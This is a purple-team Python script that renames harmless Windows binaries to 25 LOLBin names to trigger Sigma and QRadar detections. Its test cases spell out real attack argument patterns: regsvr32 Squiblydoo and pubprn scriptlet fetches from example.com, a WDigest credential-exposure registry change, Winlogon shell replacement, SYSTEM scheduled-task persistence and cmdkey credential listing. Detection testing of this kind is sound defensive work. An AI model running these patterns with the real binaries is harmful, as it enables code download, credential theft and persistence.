r"""
LOLBin Masquerading Tester -- 25 This-Week Binaries
======================================================
Scope: Pubprn.vbs, winrm.vbs, UtilityFunctions.ps1,
  Microsoft.Workflow.Compiler.exe, Aspnet_Compiler.exe, odbcconf.exe,
  reg.exe, Replace.exe, IEExec.exe, Pcwrun.exe, register-cimprovider.exe,
  Imewdbld.exe, Launch-VsDevShell.ps1, Cscript.exe/Wscript.exe, Jsc.exe,
  Ftp.exe, Regsvr32.exe, Schtasks.exe, DeviceCredentialDeployment.exe,
  Forfiles.exe, Cmdkey.exe, Atbroker.exe, Conhost.exe, iediagcmd.exe,
  Print.exe

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
THREE SPAWN STYLES USED IN THIS SCRIPT:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. DIRECT (hostname.exe renamed to LOLBin, run with suspicious args)
   Used for: Microsoft.Workflow.Compiler, Aspnet_Compiler, odbcconf,
   reg, Replace, IEExec, Imewdbld, Jsc, Ftp, Regsvr32, Schtasks,
   DeviceCredentialDeployment, Forfiles, Cmdkey, Atbroker, iediagcmd,
   Print, register-cimprovider

2. PARENT-CHILD (cmd.exe renamed to LOLBin, spawns hostname.exe as child)
   Used for: Pcwrun.exe, Conhost.exe
   Sigma rule fires on the CHILD's event where ParentImage = the LOLBin.
   Identical mechanism to Hh.exe / RunExeHelper from prior rounds.

3. INTERPRETER (hostname.exe renamed to cscript.exe or powershell.exe,
   with the script filename in CommandLine)
   Used for: Pubprn.vbs, winrm.vbs, Cscript.exe/Wscript.exe,
             UtilityFunctions.ps1, Launch-VsDevShell.ps1
   .vbs and .ps1 files are not binaries -- the 4688 event records the
   INTERPRETER as Image and the script path in CommandLine. QRadar rules
   for these LOLBins check CommandLine for the script name, not Image.
   Our renamed hostname.exe (as cscript.exe or powershell.exe) satisfies
   the Image|endswith condition; the script filename in args satisfies
   the CommandLine condition. This is the correct, highest-fidelity
   approach for script-based LOLBins.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SIGMA SOURCES (verified from SigmaHQ master / detection.fyi, Sep 2026):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Pubprn.vbs         proc_creation_win_lolbin_pubprn.yml
  cscript.exe + CommandLine contains 'pubprn' AND 'script:http'
  (Pubprn.vbs can be pointed at a remote .sct scriptlet via the
  script: protocol, bypassing AppLocker)

winrm.vbs          proc_creation_win_winrm_execution_via_scripting_api_winrm_vbs.yml
  cscript.exe + CommandLine contains 'winrm.vbs'

UtilityFunctions.ps1  No dedicated Sigma rule -- powershell.exe +
  script name in CommandLine. Share QRadar rule text to tighten.

Microsoft.Workflow.Compiler.exe  proc_creation_win_microsoft_workflow_compiler_execution.yml
  Image|endswith '\Microsoft.Workflow.Compiler.exe'
  + CommandLine contains a .xml file reference

Aspnet_Compiler.exe  proc_creation_win_lolbin_aspnet_compiler.yml
                     proc_creation_win_aspnet_compiler_susp_child_process.yml
  Direct: any execution of aspnet_compiler.exe is flagged
  Parent-child: child process in suspicious path (temp dir)

odbcconf.exe       proc_creation_win_odbcconf_response_file.yml
                   proc_creation_win_odbcconf_exec_susp_locations.yml
  -f <file> to load response file (any extension)
  OR /A {REGSVR <dll>} to register a DLL
  OR DLL path in AppData\Local\Temp (suspicious location rule)

reg.exe            proc_creation_win_reg_susp_paths.yml
  reg add on sensitive paths: Winlogon, WDigest, Windows Defender,
  CurrentControlSet\Control\SecurityProviders

Replace.exe        No dedicated Sigma rule -- LOLBAS: copies file to
  destination silently. Share QRadar rule text.

IEExec.exe         No dedicated Sigma rule -- LOLBAS: executes remote
  .NET assemblies via URL. Share QRadar rule text.

Pcwrun.exe         proc_creation_win_lolbin_pcwrun.yml
  PARENT-CHILD: ParentImage|endswith '\pcwrun.exe'
  Fires on any child whose parent is pcwrun.exe.

register-cimprovider.exe  No dedicated Sigma rule -- process name only.

Imewdbld.exe       proc_creation_win_imewbdld_download.yml
  Image|endswith '\IMEWDBLD.exe'
  CommandLine contains 'http' or 'https' URL

Launch-VsDevShell.ps1  No dedicated Sigma rule -- powershell.exe +
  script name in CommandLine. Share QRadar rule text.

Cscript.exe/Wscript.exe  proc_creation_win_wscript_cscript_script_exec.yml
  Image|endswith '\cscript.exe' or '\wscript.exe'
  CommandLine contains .vbs, .js, .jse, .wsf etc.

Jsc.exe            No dedicated Sigma rule -- LOLBAS: JS compiler.
  Share QRadar rule text.

Ftp.exe            proc_creation_win_susp_ftp_execution.yml (threat-hunting)
  Image|endswith '\ftp.exe' + CommandLine contains '-s:' OR '-i'

Regsvr32.exe       proc_creation_win_regsvr32_squiblydoo.yml (high)
                   proc_creation_win_regsvr32_network_pattern.yml
  Squiblydoo: /s /n /u /i:http://example.com/decoy.sct scrobj.dll
  Network: /i http:// or /i ftp://

Schtasks.exe       proc_creation_win_schtasks_creation.yml
                   proc_creation_win_schtasks_env_folder.yml
  /create + /sc once/onstart + /tr pointing to temp path

DeviceCredentialDeployment.exe  No dedicated Sigma rule -- name only.

Forfiles.exe       proc_creation_win_forfiles_proxy_execution_.yml
  /p <path> /c "cmd /c <payload>" pattern

Cmdkey.exe         proc_creation_win_cmdkey_recon.yml
  CommandLine contains '/list' (credential enumeration)
  OR '/add' (credential storage)

Atbroker.exe       proc_creation_win_atbroker_uncommon_ats_execution.yml
  CommandLine NOT containing built-in AT apps
  (osk, stickykeys, utilman, narrator, magnify, atbroker)

Conhost.exe        proc_creation_win_conhost_susp_child_process.yml
  PARENT-CHILD: ParentImage|endswith '\conhost.exe'
  Fires on uncommon child processes of conhost.

iediagcmd.exe      No dedicated Sigma rule -- name only.

Print.exe          No dedicated Sigma rule -- LOLBAS: file copy via
  print port. Share QRadar rule text.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SAFETY MODEL (unchanged throughout this series):
  All processes are hash-verified copies of hostname.exe (direct,
  interpreter) or cmd.exe (parent-child). Popen() used throughout
  (not subprocess.run) to capture real PIDs. Cleanup verified.
  Stray folders swept at startup.

REQUIREMENTS: Windows only.
"""

import hashlib
import json
import os
import platform
import shutil
import subprocess
import sys
import tempfile
import time
from datetime import datetime
from pathlib import Path

KEEP_RESULTS_LOG = True
CANARY_TAG = f"PURPLE-TEAM-TEST-{datetime.now().strftime('%Y%m%d%H%M%S')}"
SAFE_SOURCE_BINARY = r"C:\Windows\System32\hostname.exe"
SAFE_PARENT_BINARY = r"C:\Windows\System32\cmd.exe"
DROP_ARTIFACT_FILES = True

# spawn_style:
#   "direct"      -- hostname.exe renamed to LOLBin name, run with suspicious args
#   "parent_child"-- cmd.exe renamed to LOLBin, invokes hostname.exe as real child
#   "interpreter" -- hostname.exe renamed to cscript.exe or powershell.exe,
#                    with LOLBin script name in CommandLine

LOLBIN_TEST_CASES = {
    "Pubprn.vbs": {
        "spawn_style": "interpreter",
        "interpreter": "cscript.exe",
        "sigma_rule": "proc_creation_win_lolbin_pubprn.yml",
        "sigma_condition": "cscript.exe CommandLine contains 'pubprn' AND 'script:http'",
        "artifact": None,
        "args_variants": [
            # Classic AppLocker bypass via remote .sct scriptlet
            lambda wd: ["//nologo", str(wd / "pubprn.vbs"),
                        "127.0.0.1", "script:https://example.com/decoy.sct"],
        ],
    },
    "winrm.vbs": {
        "spawn_style": "interpreter",
        "interpreter": "cscript.exe",
        "sigma_rule": "proc_creation_win_winrm_execution_via_scripting_api_winrm_vbs.yml",
        "sigma_condition": "cscript.exe CommandLine contains 'winrm.vbs'",
        "artifact": None,
        "args_variants": [
            lambda wd: ["//nologo", str(wd / "winrm.vbs"), "get", "wmicimv2/Win32_Process"],
        ],
    },
    "UtilityFunctions.ps1": {
        "spawn_style": "interpreter",
        "interpreter": "powershell.exe",
        "sigma_rule": "No dedicated Sigma rule -- share QRadar rule text",
        "sigma_condition": "powershell.exe + CommandLine contains 'UtilityFunctions.ps1'",
        "artifact": None,
        "args_variants": [
            lambda wd: ["-ExecutionPolicy", "Bypass",
                        "-File", str(wd / "UtilityFunctions.ps1")],
        ],
    },
    "Microsoft.Workflow.Compiler.exe": {
        "spawn_style": "direct",
        "sigma_rule": "proc_creation_win_microsoft_workflow_compiler_execution.yml",
        "sigma_condition": "Image|endswith '\\Microsoft.Workflow.Compiler.exe' + .xml file in CommandLine",
        "artifact": "decoy_workflow.xml",
        "args_variants": [
            lambda wd: [str(wd / "decoy_workflow.xml"),
                        str(wd / "decoy_output.dll")],
        ],
    },
    "Aspnet_Compiler.exe": {
        "spawn_style": "direct",
        "sigma_rule": "proc_creation_win_lolbin_aspnet_compiler.yml",
        "sigma_condition": "Any execution of aspnet_compiler.exe flagged (direct rule); also parent-child rule",
        "artifact": None,
        "args_variants": [
            # -v virtual path -p physical path -u updateable -f overwrite -d debug
            lambda wd: ["-v", "/", "-p", str(wd), "-u", "-f",
                        str(wd / "decoy_output")],
        ],
    },
    "odbcconf.exe": {
        "spawn_style": "direct",
        "sigma_rule": "proc_creation_win_odbcconf_response_file.yml + proc_creation_win_odbcconf_exec_susp_locations.yml",
        "sigma_condition": (
            "-f <file> to load response file "
            "OR /A {REGSVR <dll_in_temp>}"
        ),
        "artifact": "decoy_config.rsp",
        "args_variants": [
            # Response file with non-.rsp extension (suspicious variant)
            lambda wd: ["-f", str(wd / "decoy_config.rsp")],
            # Register DLL from suspicious location (AppData\Local\Temp)
            lambda wd: ["/A", "{REGSVR " + str(wd / "decoy_payload.dll") + "}"],
        ],
    },
    "reg.exe": {
        "spawn_style": "direct",
        "sigma_rule": "proc_creation_win_reg_susp_paths.yml",
        "sigma_condition": (
            "reg add on sensitive paths: "
            "Winlogon / WDigest / Windows Defender / SecurityProviders"
        ),
        "artifact": None,
        "args_variants": [
            # WDigest UseLogonCredential -- classic credential dumping enablement
            lambda wd: ["add",
                        r"HKLM\SYSTEM\CurrentControlSet\Control"
                        r"\SecurityProviders\WDigest",
                        "/v", "UseLogonCredential", "/t", "REG_DWORD",
                        "/d", "1", "/f"],
            # Winlogon shell replacement
            lambda wd: ["add",
                        r"HKLM\SOFTWARE\Microsoft\Windows NT"
                        r"\Currentversion\Winlogon",
                        "/v", "Shell", "/t", "REG_SZ",
                        "/d", "explorer.exe", "/f"],
        ],
    },
    "Replace.exe": {
        "spawn_style": "direct",
        "sigma_rule": "No dedicated Sigma rule -- LOLBAS: silent file copy via replace",
        "sigma_condition": "Process name + source/dest args. Share QRadar rule text.",
        "artifact": "decoy_source.txt",
        "args_variants": [
            # Replace <source> <dest> -- silently copies/overwrites file
            lambda wd: [str(wd / "decoy_source.txt"),
                        str(wd), "/A"],
        ],
    },
    "IEExec.exe": {
        "spawn_style": "direct",
        "sigma_rule": "No dedicated Sigma rule -- LOLBAS: executes remote .NET assembly",
        "sigma_condition": "Process name + URL arg. Share QRadar rule text.",
        "artifact": None,
        "args_variants": [
            lambda wd: ["https://example.com/decoy.exe"],
        ],
    },
    "Pcwrun.exe": {
        "spawn_style": "parent_child",
        "sigma_rule": "proc_creation_win_lolbin_pcwrun.yml",
        "sigma_condition": "PARENT-CHILD: ParentImage|endswith '\\pcwrun.exe' (fires on child)",
        "artifact": None,
        "args_variants": [lambda wd: []],
    },
    "register-cimprovider.exe": {
        "spawn_style": "direct",
        "sigma_rule": "No dedicated Sigma rule -- process name only",
        "sigma_condition": "Process name match. Share QRadar rule text to improve.",
        "artifact": "decoy_provider.dll",
        "args_variants": [
            lambda wd: ["-path", str(wd / "decoy_provider.dll")],
        ],
    },
    "Imewdbld.exe": {
        "spawn_style": "direct",
        "sigma_rule": "proc_creation_win_imewbdld_download.yml",
        "sigma_condition": "Image|endswith '\\IMEWDBLD.exe' + CommandLine contains http/https",
        "artifact": None,
        "args_variants": [
            lambda wd: ["https://example.com/decoy_wordlist.exe"],
        ],
    },
    "Launch-VsDevShell.ps1": {
        "spawn_style": "interpreter",
        "interpreter": "powershell.exe",
        "sigma_rule": "No dedicated Sigma rule -- share QRadar rule text",
        "sigma_condition": "powershell.exe + CommandLine contains 'Launch-VsDevShell.ps1'",
        "artifact": None,
        "args_variants": [
            lambda wd: ["-ExecutionPolicy", "Bypass",
                        "-File", str(wd / "Launch-VsDevShell.ps1"),
                        "-VsInstallPath", r"C:\Program Files\Microsoft Visual Studio\2022\Community"],
        ],
    },
    "Cscript.exe": {
        "spawn_style": "interpreter",
        "interpreter": "cscript.exe",
        "sigma_rule": "proc_creation_win_wscript_cscript_script_exec.yml",
        "sigma_condition": "Image|endswith '\\cscript.exe' + CommandLine contains .vbs/.js/.wsf etc.",
        "artifact": "decoy_payload.vbs",
        "args_variants": [
            # .vbs execution from suspicious path (work_dir is in AppData\Local\Temp)
            lambda wd: ["//nologo", str(wd / "decoy_payload.vbs")],
            # .js execution via cscript
            lambda wd: ["//nologo", str(wd / "decoy_payload.js")],
            # Execution with explicit engine specification
            lambda wd: ["/e:vbscript", str(wd / "decoy_payload.vbs")],
        ],
    },
    "Jsc.exe": {
        "spawn_style": "direct",
        "sigma_rule": "No dedicated Sigma rule -- LOLBAS: JScript compiler in .NET",
        "sigma_condition": "Process name + .js file arg. Share QRadar rule text.",
        "artifact": "decoy_payload.js",
        "args_variants": [
            lambda wd: [str(wd / "decoy_payload.js"),
                        "/out:" + str(wd / "decoy_output.exe")],
        ],
    },
    "Ftp.exe": {
        "spawn_style": "direct",
        "sigma_rule": "proc_creation_win_susp_ftp_execution.yml (threat-hunting)",
        "sigma_condition": "Image|endswith '\\ftp.exe' + CommandLine contains '-s:' (script file)",
        "artifact": "decoy_ftp_script.txt",
        "args_variants": [
            # -s: runs an FTP script file (commonly abused for download + execute)
            lambda wd: ["-i", "-s:" + str(wd / "decoy_ftp_script.txt")],
        ],
    },
    "Regsvr32.exe": {
        "spawn_style": "direct",
        "sigma_rule": "proc_creation_win_regsvr32_squiblydoo.yml, proc_creation_win_regsvr32_network_pattern.yml",
        "sigma_condition": (
            "Squiblydoo: /s /n /u /i:http://example.com/decoy.sct scrobj.dll "
            "OR Network: /i http:// or /i ftp://"
        ),
        "artifact": None,
        "args_variants": [
            # Squiblydoo -- canonical AppLocker/WDAC bypass using scrobj.dll scriptlets
            lambda wd: ["/s", "/n", "/u", "/i:https://example.com/decoy.sct",
                        "scrobj.dll"],
            # Network DLL registration pattern
            lambda wd: ["/s", "/i", "https://example.com/decoy.dll",
                        "scrobj.dll"],
        ],
    },
    "Schtasks.exe": {
        "spawn_style": "direct",
        "sigma_rule": "proc_creation_win_schtasks_creation.yml + proc_creation_win_schtasks_env_folder.yml",
        "sigma_condition": "/create + /sc + /tr pointing to suspicious temp path",
        "artifact": "decoy_task_payload.exe",
        "args_variants": [
            # Scheduled task creation pointing to suspicious temp location
            lambda wd: ["/create", "/f", "/sc", "once",
                        "/tn", "DecoySvcTask",
                        "/tr", str(wd / "decoy_task_payload.exe"),
                        "/st", "00:00"],
            # Onstart persistence variant
            lambda wd: ["/create", "/f", "/sc", "onstart",
                        "/tn", "DecoyStartupTask",
                        "/ru", "SYSTEM",
                        "/tr", str(wd / "decoy_task_payload.exe")],
        ],
    },
    "DeviceCredentialDeployment.exe": {
        "spawn_style": "direct",
        "sigma_rule": "No dedicated Sigma rule -- process name only",
        "sigma_condition": "Process name match. Share QRadar rule text.",
        "artifact": None,
        "args_variants": [lambda wd: []],
    },
    "Forfiles.exe": {
        "spawn_style": "direct",
        "sigma_rule": "proc_creation_win_forfiles_proxy_execution_.yml",
        "sigma_condition": "/p <path> /c 'cmd /c <payload>' -- proxy execution via forfiles",
        "artifact": None,
        "args_variants": [
            # Primary Sigma pattern: forfiles with /p /c cmd.exe /c payload
            lambda wd: ["/p", r"C:\Windows\System32", "/m", "notepad.exe",
                        "/c", "cmd.exe /c " + str(wd / "decoy_payload.exe")],
            # AppData variant to satisfy suspicious-path condition
            lambda wd: ["/p", str(wd), "/m", "*.txt",
                        "/c", "cmd.exe /c echo " + CANARY_TAG],
        ],
    },
    "Cmdkey.exe": {
        "spawn_style": "direct",
        "sigma_rule": "proc_creation_win_cmdkey_recon.yml",
        "sigma_condition": "CommandLine contains '/list' (recon) OR '/add' (store creds)",
        "artifact": None,
        "args_variants": [
            # /list -- enumerate stored credentials (recon)
            lambda wd: ["/list"],
            # /add -- store credential (persistence / lateral movement prep)
            lambda wd: ["/add:decoy-target",
                        "/user:decoyuser",
                        "/pass:decoypassword"],
        ],
    },
    "Atbroker.exe": {
        "spawn_style": "direct",
        "sigma_rule": "proc_creation_win_atbroker_uncommon_ats_execution.yml",
        "sigma_condition": (
            "CommandLine does NOT match built-in AT apps "
            "(osk, stickykeys, utilman, narrator, magnify). "
            "Custom app name satisfies rule."
        ),
        "artifact": None,
        "args_variants": [
            # Custom AT app name -- NOT in built-in exclusion list
            lambda wd: ["/start", "decoyat"],
            lambda wd: ["/start", "customshell"],
        ],
    },
    "Conhost.exe": {
        "spawn_style": "parent_child",
        "sigma_rule": "proc_creation_win_conhost_susp_child_process.yml",
        "sigma_condition": "PARENT-CHILD: ParentImage|endswith '\\conhost.exe' (fires on uncommon child)",
        "artifact": None,
        "args_variants": [lambda wd: []],
    },
    "iediagcmd.exe": {
        "spawn_style": "direct",
        "sigma_rule": "No dedicated Sigma rule -- process name only",
        "sigma_condition": "Process name match. Share QRadar rule text to improve.",
        "artifact": None,
        "args_variants": [
            lambda wd: ["/iediag"],
        ],
    },
    "Print.exe": {
        "spawn_style": "direct",
        "sigma_rule": "No dedicated Sigma rule -- LOLBAS: file copy via print port",
        "sigma_condition": "Process name + source/dest args. Share QRadar rule text.",
        "artifact": "decoy_source.txt",
        "args_variants": [
            # Print.exe /d:<dest> <source> -- copies file through print port
            lambda wd: ["/d:" + str(wd / "decoy_output.txt"),
                        str(wd / "decoy_source.txt")],
        ],
    },
}


def sha256_of(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


def sweep_stray_runs():
    removed = []
    for p in Path(tempfile.gettempdir()).glob("lolbin25w_*"):
        if p.is_dir():
            shutil.rmtree(p, ignore_errors=True)
            if not p.exists():
                removed.append(str(p))
    return removed


def verified_cleanup(work_dir):
    shutil.rmtree(work_dir, ignore_errors=True)
    if not work_dir.exists():
        return True, []
    leftover = []
    for p in work_dir.rglob("*"):
        if p.is_file():
            try:
                p.unlink()
            except Exception:
                leftover.append(str(p))
    try:
        work_dir.rmdir()
    except Exception:
        pass
    return (not work_dir.exists()), leftover


def run_and_classify(cmd, timeout=15):
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE)
        pid = proc.pid
        try:
            proc.communicate(timeout=timeout)
            return f"exited on its own (rc={proc.returncode})", pid
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.communicate()
            return f"did not exit within {timeout}s -- killed", pid
    except OSError as e:
        if getattr(e, "winerror", None) == 5:
            return "BLOCKED (WinError 5 -- EDR/AV prevention fired)", None
        return f"launch error: {e}", None
    except Exception as e:
        return f"error: {e}", None


def casing_variants(name):
    seen, out = set(), []
    for v in [name.lower(), name, name.upper()]:
        if v not in seen:
            seen.add(v)
            out.append(v)
    return out


def main():
    if platform.system() != "Windows":
        print("Windows only -- exiting without doing anything.")
        sys.exit(1)

    for binary in [SAFE_SOURCE_BINARY, SAFE_PARENT_BINARY]:
        if not Path(binary).exists():
            print(f"Cannot find {binary} -- aborting.")
            sys.exit(1)

    source_hash = sha256_of(SAFE_SOURCE_BINARY)
    parent_hash = sha256_of(SAFE_PARENT_BINARY)

    stray = sweep_stray_runs()
    if stray:
        print(f"Swept {len(stray)} leftover folder(s) from a previous run.\n")

    work_dir = Path(tempfile.mkdtemp(prefix="lolbin25w_"))
    print("=" * 78)
    print("LOLBin Tester -- 25 this-week binaries (3 spawn styles)")
    print("=" * 78)
    print(f"Canary tag     : {CANARY_TAG}")
    print(f"hostname SHA256: {source_hash}")
    print(f"cmd.exe SHA256 : {parent_hash}")
    print(f"Working dir    : {work_dir}")
    print(f"  (in \\AppData\\Local\\Temp\\ -- satisfies suspicious-path conditions)\n")

    log = []
    try:
        for canonical_name, cfg in LOLBIN_TEST_CASES.items():
            print(f"{'='*60}")
            print(f"[*] {canonical_name}  [spawn: {cfg['spawn_style']}]")
            print(f"    Sigma : {cfg['sigma_rule']}")
            print(f"    Cond  : {cfg['sigma_condition']}")
            print()

            if DROP_ARTIFACT_FILES and cfg["artifact"]:
                (work_dir / cfg["artifact"]).write_text(
                    f"PURPLE TEAM TEST ARTIFACT - NOT EXECUTABLE\n"
                    f"Canary: {CANARY_TAG}\n"
                )

            # Also drop common placeholder files referenced in args
            for ext in ["decoy_payload.vbs", "decoy_payload.js",
                        "decoy_payload.dll", "decoy_payload.exe",
                        "UtilityFunctions.ps1", "Launch-VsDevShell.ps1",
                        "pubprn.vbs", "winrm.vbs",
                        "decoy_ftp_script.txt", "decoy_source.txt",
                        "decoy_workflow.xml"]:
                p = work_dir / ext
                if not p.exists():
                    p.write_text(
                        f"PURPLE TEAM TEST ARTIFACT - NOT EXECUTABLE\n"
                        f"Canary: {CANARY_TAG}\n"
                    )

            # -----------------------------------------------------------
            # PARENT-CHILD spawn: cmd.exe renamed to LOLBin name
            # -----------------------------------------------------------
            if cfg["spawn_style"] == "parent_child":
                for case_name in casing_variants(canonical_name):
                    decoy_path = work_dir / case_name
                    shutil.copy2(SAFE_PARENT_BINARY, decoy_path)
                    if sha256_of(decoy_path) != parent_hash:
                        print(f"    [{case_name}] hash mismatch (cmd copy) -- ABORTED")
                        continue
                    cmd = [str(decoy_path), "/c", SAFE_SOURCE_BINARY]
                    print(f"    [{case_name}] {' '.join(cmd)}")
                    print(f"    (child's ParentImage = {case_name})")
                    ts = datetime.now().isoformat()
                    status, pid = run_and_classify(cmd)
                    print(f"         -> {status}  pid={pid}")
                    log.append({"canonical_name": canonical_name, "cased_as": case_name,
                                "spawn_style": "parent_child", "variant": 1,
                                "timestamp": ts, "command": " ".join(cmd),
                                "status": status, "pid": pid})
                    time.sleep(0.75)
                print()
                continue

            # -----------------------------------------------------------
            # INTERPRETER spawn: hostname.exe renamed to cscript/powershell
            # -----------------------------------------------------------
            if cfg["spawn_style"] == "interpreter":
                interp_name = cfg["interpreter"]
                # Try all casings of the interpreter name
                for case_interp in casing_variants(interp_name):
                    decoy_path = work_dir / case_interp
                    shutil.copy2(SAFE_SOURCE_BINARY, decoy_path)
                    if sha256_of(decoy_path) != source_hash:
                        print(f"    [{case_interp}] hash mismatch -- ABORTED")
                        continue
                    blocked = False
                    for i, args_fn in enumerate(cfg["args_variants"], start=1):
                        cmd = [str(decoy_path)] + args_fn(work_dir)
                        print(f"    [{case_interp}] v{i}: {' '.join(cmd)}")
                        ts = datetime.now().isoformat()
                        status, pid = run_and_classify(cmd)
                        print(f"         -> {status}  pid={pid}")
                        log.append({"canonical_name": canonical_name,
                                    "cased_as": case_interp,
                                    "spawn_style": "interpreter",
                                    "interpreter_used": interp_name,
                                    "variant": i, "timestamp": ts,
                                    "command": " ".join(cmd),
                                    "status": status, "pid": pid})
                        time.sleep(0.75)
                        if "BLOCKED" in status:
                            blocked = True
                            break
                    if blocked:
                        break
                print()
                continue

            # -----------------------------------------------------------
            # DIRECT spawn: hostname.exe renamed to LOLBin
            # -----------------------------------------------------------
            blocked_globally = False
            for case_name in casing_variants(canonical_name):
                if blocked_globally:
                    break
                decoy_path = work_dir / case_name
                shutil.copy2(SAFE_SOURCE_BINARY, decoy_path)
                if sha256_of(decoy_path) != source_hash:
                    print(f"    [{case_name}] hash mismatch -- ABORTED")
                    continue
                for i, args_fn in enumerate(cfg["args_variants"], start=1):
                    cmd = [str(decoy_path)] + args_fn(work_dir)
                    print(f"    [{case_name}] v{i}: {' '.join(cmd)}")
                    ts = datetime.now().isoformat()
                    status, pid = run_and_classify(cmd)
                    print(f"         -> {status}  pid={pid}")
                    log.append({"canonical_name": canonical_name,
                                "cased_as": case_name,
                                "spawn_style": "direct",
                                "variant": i, "timestamp": ts,
                                "command": " ".join(cmd),
                                "status": status, "pid": pid})
                    time.sleep(0.75)
                    if "BLOCKED" in status:
                        blocked_globally = True
                        break
            print()
    finally:
        cleaned, leftover = verified_cleanup(work_dir)

    print("=" * 78)
    print(f"CLEANUP: {work_dir} removed = {cleaned}")
    if not cleaned:
        for f in leftover:
            print(f"  STUCK: {f}")
    print("=" * 78 + "\n")

    if KEEP_RESULTS_LOG:
        results_file = Path.cwd() / f"lolbin25w_results_{CANARY_TAG}.json"
        with open(results_file, "w") as f:
            json.dump({"canary_tag": CANARY_TAG,
                       "hostname_sha256": source_hash,
                       "cmd_sha256": parent_hash,
                       "work_dir_cleaned": cleaned,
                       "results": log}, f, indent=2)
        print(f"Results saved: {results_file}")

    direct_c = sum(1 for e in log if e.get("spawn_style") == "direct")
    parent_c = sum(1 for e in log if e.get("spawn_style") == "parent_child")
    interp_c = sum(1 for e in log if e.get("spawn_style") == "interpreter")
    blocked_c = sum(1 for e in log if "BLOCKED" in e.get("status", ""))

    print(f"\nSearch QRadar for canary tag: {CANARY_TAG}")
    print(f"Events generated: {direct_c} direct | {parent_c} parent-child | {interp_c} interpreter")
    print(f"Blocked by EDR prevention: {blocked_c}")
    print(r"""
SHARE RULE TEXT FOR THESE 8 (no public Sigma rule found):
  Replace.exe, IEExec.exe, register-cimprovider.exe, Jsc.exe,
  DeviceCredentialDeployment.exe, iediagcmd.exe, Print.exe,
  UtilityFunctions.ps1, Launch-VsDevShell.ps1
""")


if __name__ == "__main__":
    main()
